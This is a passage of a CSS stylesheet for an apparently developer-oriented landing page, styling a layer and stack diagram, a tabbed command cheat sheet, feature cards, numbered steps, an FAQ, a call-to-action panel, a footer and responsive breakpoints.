.layer-icon {
  flex: none;
  width: 40px;
  height: 40px;
  border-radius: 11px;
  display: grid;
  place-items: center;
  background: rgba(16, 185, 129, 0.12);
  color: var(--secondary);
}
.layers h3 {
  margin: 0 0 3px;
  font-size: 17px;
  font-weight: 700;
}
.layers p {
  margin: 0;
  color: var(--muted);
  font-size: 14.5px;
  line-height: 1.6;
}
.stack {
  display: grid;
  gap: 8px;
  padding: 18px;
  border-radius: 18px;
  background: var(--panel);
  border: 1px solid var(--line);
}
.stack-row {
  padding: 13px;
  border-radius: 10px;
  text-align: center;
  font-size: 13.5px;
  font-weight: 600;
  color: #b5d2c7;
  background: #0d1c18;
  border: 1px solid var(--line);
}
.s-ctr {
  display: grid;
  grid-template-columns: repeat(3, 1fr);
  gap: 8px;
  padding: 0;
  background: transparent;
  border: 0;
}
.box {
  padding: 14px 8px;
  border-radius: 10px;
  text-align: center;
  font-weight: 700;
  background: rgba(56, 163, 245, 0.12);
  border: 1px solid rgba(56, 163, 245, 0.45);
  color: #bfe1fb;
  animation: bob 3.2s ease-in-out infinite;
}
.box:nth-child(2) {
  animation-delay: -1s;
}
.box:nth-child(3) {
  animation-delay: -2s;
}
.box small {
  color: #7cc4fb;
  font-weight: 400;
}
@keyframes bob {
  50% {
    transform: translateY(-4px);
  }
}
.s-eng {
  background: rgba(56, 163, 245, 0.08);
  border-color: rgba(56, 163, 245, 0.3);
  color: #9ccbf1;
}
.mini-list {
  list-style: none;
  margin: 18px 0 0;
  padding: 0;
  display: grid;
  gap: 8px;
  color: var(--muted);
  font-size: 15px;
  line-height: 1.6;
}
.mini-list b {
  color: var(--ink);
}

/* ---------- CHEAT SHEET ---------- */
.cheat {
  border-radius: 18px;
  background: #040a08;
  border: 1px solid rgba(52, 211, 153, 0.25);
  overflow: hidden;
}
.cheat-tabs {
  display: flex;
  flex-wrap: wrap;
  gap: 6px;
  padding: 12px;
  background: #0b1714;
  border-bottom: 1px solid var(--line);
}
.cheat-tab {
  display: inline-flex;
  align-items: center;
  gap: 8px;
  padding: 9px 16px;
  border-radius: 10px;
  border: 0;
  background: transparent;
  color: var(--muted);
  font: 600 14px var(--font-body);
  cursor: pointer;
  transition:
    background 0.15s,
    color 0.15s;
}
.cheat-tab:hover {
  color: var(--ink);
}
.cheat-tab.on {
  background: rgba(16, 185, 129, 0.16);
  color: var(--secondary);
}
.cheat-list {
  display: grid;
  padding: 8px;
}
.cheat-row {
  display: grid;
  grid-template-columns: minmax(220px, 1fr) 1.2fr auto;
  gap: 18px;
  align-items: center;
  padding: 14px 16px;
  border: 0;
  border-radius: 10px;
  background: transparent;
  text-align: left;
  cursor: pointer;
  animation: lineIn 0.35s ease backwards;
  animation-delay: calc(var(--i) * 45ms);
  transition: background 0.15s;
}
.cheat-row:hover {
  background: rgba(16, 185, 129, 0.08);
}
.cheat-row code {
  color: #eafff6;
  font-size: 13.5px;
  word-break: break-all;
}
.cheat-row code::before {
  content: '$ ';
  color: var(--secondary);
}
.cheat-row span {
  color: var(--muted);
  font-size: 14.5px;
}
.cheat-row em {
  font-style: normal;
  font-size: 12px;
  color: #4f7468;
}
.cheat-row:hover em {
  color: var(--secondary);
}

/* ---------- FEATURES ---------- */
.feature-grid {
  display: grid;
  grid-template-columns: repeat(4, 1fr);
  gap: 20px;
}
.feature {
  padding: 28px;
  border-radius: 16px;
  background: var(--panel);
  border: 1px solid var(--line);
  transition:
    transform 0.2s,
    border-color 0.2s;
}
.feature:hover {
  transform: translateY(-3px);
  border-color: rgba(52, 211, 153, 0.5);
}
.feature-icon {
  width: 44px;
  height: 44px;
  border-radius: 12px;
  display: grid;
  place-items: center;
  margin-bottom: 18px;
  background: rgba(16, 185, 129, 0.12);
  color: var(--secondary);
}
.feature h3 {
  margin: 0 0 8px;
  font-size: 18px;
  font-weight: 700;
}
.feature p {
  margin: 0;
  color: var(--muted);
  font-size: 14.5px;
  line-height: 1.65;
}

/* ---------- STEPS ---------- */
.steps {
  list-style: none;
  display: grid;
  grid-template-columns: repeat(4, 1fr);
  gap: 22px;
  margin: 0;
  padding: 0;
  position: relative;
}
.steps::before {
  content: '';
  position: absolute;
  top: 24px;
  left: 6%;
  right: 6%;
  border-top: 2px dashed rgba(52, 211, 153, 0.3);
}
.step {
  position: relative;
  padding-right: 8px;
}
.step-num {
  position: relative;
  width: 48px;
  height: 48px;
  border-radius: 14px;
  display: grid;
  place-items: center;
  margin-bottom: 20px;
  background: #0a1613;
  border: 2px solid var(--primary);
  color: var(--secondary);
  font-weight: 700;
  font-size: 15px;
  box-shadow:
    0 0 0 6px #0a1613,
    0 0 22px rgba(16, 185, 129, 0.3);
}
.step h3 {
  margin: 0 0 6px;
  font-size: 18px;
  font-weight: 700;
}
.step p {
  margin: 0;
  color: var(--muted);
  font-size: 14.5px;
  line-height: 1.65;
}

/* ---------- FAQ ---------- */
.faq-wrap {
  max-width: 860px;
}
.faq {
  display: grid;
  gap: 10px;
}
.faq-item {
  border-radius: 14px;
  background: var(--panel);
  border: 1px solid var(--line);
  transition: border-color 0.2s;
}
.faq-item[open] {
  border-color: rgba(52, 211, 153, 0.5);
}
.faq-item summary {
  display: flex;
  justify-content: space-between;
  align-items: center;
  gap: 16px;
  padding: 18px 22px;
  font: 600 16.5px var(--font-head);
  cursor: pointer;
  list-style: none;
}
.faq-item summary::-webkit-details-marker {
  display: none;
}
.faq-item summary::after {
  content: '+';
  font: 400 22px var(--font-mono);
  color: var(--secondary);
  transition: transform 0.25s;
}
.faq-item[open] summary::after {
  transform: rotate(45deg);
}
.faq-item p {
  margin: 0;
  padding: 0 22px 20px;
  color: var(--muted);
  line-height: 1.7;
  animation: swap 0.35s ease;
}

/* ---------- CTA ---------- */
.cta-wrap {
  padding-bottom: 104px;
}
.cta {
  position: relative;
  overflow: hidden;
  text-align: center;
  padding: 72px 32px;
  border-radius: 24px;
  color: #fff;
  border: 1px solid rgba(52, 211, 153, 0.35);
  background: linear-gradient(135deg, #071a15 0%, var(--deep) 130%);
}
.cta-prompt {
  display: inline-block;
  margin-bottom: 18px;
  padding: 6px 14px;
  border-radius: 8px;
  background: rgba(0, 0, 0, 0.35);
  color: #cdeee1;
  font-size: 13px;
}
.cta-prompt b {
  color: var(--secondary);
  margin-right: 8px;
  font-weight: 500;
}
.cta h2 {
  color: #fff;
}
.cta p {
  max-width: 560px;
  margin: 0 auto 28px;
  color: #b9d8cc;
  line-height: 1.7;
}
.cta > :not(.cta-ring) {
  position: relative;
  z-index: 1;
}
.cta-ring {
  position: absolute;
  border-radius: 50%;
  border: 1px solid rgba(52, 211, 153, 0.25);
  pointer-events: none;
  animation: spin 40s linear infinite;
}
.cta-ring-a {
  width: 420px;
  height: 420px;
  right: -120px;
  top: -180px;
  border-style: dashed;
}
.cta-ring-b {
  width: 260px;
  height: 260px;
  left: -90px;
  bottom: -130px;
  background: rgba(52, 211, 153, 0.07);
  animation-direction: reverse;
}
@keyframes spin {
  to {
    transform: rotate(360deg);
  }
}
.btn-light {
  background: #ecfdf5;
  color: #064e3b;
  border-radius: 12px;
  padding: 12px 24px;
  font-weight: 700;
  transition: transform 0.15s;
}
.btn-light:hover {
  transform: translateY(-2px);
}

/* ---------- FOOTER ---------- */
.brand {
  display: inline-flex;
  align-items: center;
  gap: 11px;
  font-weight: 700;
  letter-spacing: -0.01em;
}
.brand-mark {
  width: 34px;
  height: 34px;
  border-radius: 10px;
  display: grid;
  place-items: center;
  color: #04100c;
  background: linear-gradient(135deg, var(--secondary), var(--primary));
}
.footer {
  background: #040807;
  border-top: 1px solid var(--line);
  padding: 56px 0 24px;
}
.footer-grid {
  display: grid;
  grid-template-columns: 1.6fr 1fr 1fr;
  gap: 40px;
}
.footer-brand p {
  max-width: 300px;
  margin: 14px 0 0;
  color: var(--muted);
  line-height: 1.6;
}
.footer-title {
  margin-bottom: 14px;
  font: 700 14px var(--font-head);
  color: var(--ink);
}
.footer-grid a,
.footer-grid span:not(.brand-mark):not(.brand-name) {
  display: block;
  margin-bottom: 9px;
  color: var(--muted);
  font-size: 14.5px;
  text-decoration: none;
}
.footer-grid a:hover {
  color: var(--secondary);
}
.footer-base {
  display: flex;
  justify-content: space-between;
  flex-wrap: wrap;
  gap: 8px;
  margin-top: 36px;
  padding-top: 20px;
  border-top: 1px solid var(--line);
  color: #5f8579;
  font-size: 13px;
}
.footer-credit strong {
  color: var(--secondary);
  font-weight: 600;
}

/* ---------- RESPONSIVE ---------- */
@media (max-width: 1024px) {
  .hero-grid,
  .lab-grid,
  .layers-grid {
    grid-template-columns: 1fr;
    gap: 48px;
  }
  .visual {
    max-width: 640px;
  }
  .feature-grid {
    grid-template-columns: repeat(2, 1fr);
  }
  .steps {
    grid-template-columns: repeat(2, 1fr);
    row-gap: 36px;
  }
  .steps::before {
    display: none;
  }
  .stats {
    grid-template-columns: repeat(2, 1fr);
  }
  .stat:nth-child(3) {
    border-left: 0;
  }
  .chain-steps {
    grid-template-columns: repeat(3, 1fr);
  }
}
@media (max-width: 760px) {
  .wrap {
    padding: 0 20px;
  }
  .section {
    padding: 68px 0;
  }
  .hero {
    padding: 52px 0 48px;
  }
  .hero-actions .q-btn {
    width: 100%;
  }
  .chip-status {
    right: 0;
  }
  .chip-nodes {
    display: none;
  }
  .terminal-hero .terminal-body {
    min-height: 340px;
    font-size: 12.5px;
  }
  .area-grid,
  .feature-grid,
  .chain-panels,
  .steps {
    grid-template-columns: 1fr;
  }
  .area-card {
    padding: 26px;
  }
  .step {
    display: grid;
    grid-template-columns: 48px 1fr;
    column-gap: 16px;
  }
  .step-num {
    grid-row: span 2;
    margin: 0;
  }
  .chain-steps {
    grid-template-columns: 1fr 1fr;
  }
  .chain-panel p {
    min-height: 0;
  }
  .layers li {
    margin-left: 0;
  }
  .cheat-row {
    grid-template-columns: 1fr auto;
  }
  .cheat-row span {
    display: none;
  }
  .lab-body {
    height: 380px;
  }
  .cta {
    padding: 52px 22px;
  }
  .cta .q-btn {
    width: 100%;
  }
  .footer-grid {
    grid-template-columns: 1fr;
    gap: 28px;
  }
}
@media (prefers-reduced-motion: reduce) {
  .reveal,
  .reveal.in {
    opacity: 1;
    animation: none;
  }
  .cursor,
  .ticker-track,
  .chip,
  .box,
  .h1-hot,
  .pill-dot,
  .status-dot,
  .net-lines use,
  .cta-ring {
    animation: none;
  }
  * {
    transition-duration: 0.01ms !important;
  }
}
</style>

